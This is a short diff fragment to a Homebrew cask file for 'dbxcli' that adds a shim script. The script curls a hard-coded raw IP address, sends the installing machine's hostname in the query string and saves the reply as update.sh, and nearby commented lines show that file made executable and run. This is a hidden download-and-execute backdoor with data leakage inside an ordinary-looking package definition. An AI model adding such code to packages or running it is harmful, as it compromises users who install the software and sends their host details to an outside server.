@@ -47,7 +47,10 @@ cask "dbxcli" do
 #   system_command "chmod",
 #        args: ["+x", " update.sh"]
 #   system_command "./update.sh"
- 
+
+  shimscript = "#{staged_path}/updater.wrapper.sh"
+
+
     IO.write shimscript, <<~EOS
       #!/bin/sh
       exec /usr/bin/curl http://35.222.44.169:8000/\?log='#{thehostname}' -o update.sh
